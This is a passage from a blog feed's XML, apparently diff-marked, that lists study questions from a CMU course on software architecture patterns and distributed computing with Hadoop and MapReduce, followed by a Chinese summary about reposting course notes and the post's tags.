-<li>What is a software architecture?</li>
-<li>How is it important for writing fast code?</li>
-<li>What the the five categories of patterns in OPL?</li>
-<li>What are the nine sections in an OPL pattern?</li>
-<li>What are the areas of consideration for your Term Project?</li>
-</ul>
-<h2 id="Module_4-1"><a href="#Module_4-1" class="headerlink" title="Module 4.1"></a>Module 4.1</h2><ul>
-<li>Why Distributed Computing?</li>
-<li>How common are failures in Large Scale Distributed Computing?</li>
-<li>How are failures handled in HADOOP?</li>
-<li>What is MapReduce?</li>
-<li>When developing a MapReduce application what components and functions need to be defined?</li>
-<li>How are data bottlenecks reduced in HDFS?</li>
-<li>What are the advantages of Cloud Computing?</li>
-</ul>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>本来打算借着当助教，看看这门课有没有什么变化。事实上，没啥变化，所以这里先把当时我的笔记放出来，之后的课程可能会主要集中于代码和项目的思路分析，具体理论的东西不会再重复太多。</p>]]>
-    
-    </summary>
-    
-      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
-    
-      <category term="思考题" scheme="http://wdxtub.com/tags/%E6%80%9D%E8%80%83%E9%A2%98/"/>
-    
-      <category term="笔记" scheme="http://wdxtub.com/tags/%E7%AC%94%E8%AE%B0/"/>
     
       <category term="编程" scheme="http://wdxtub.com/tags/%E7%BC%96%E7%A8%8B/"/>
     
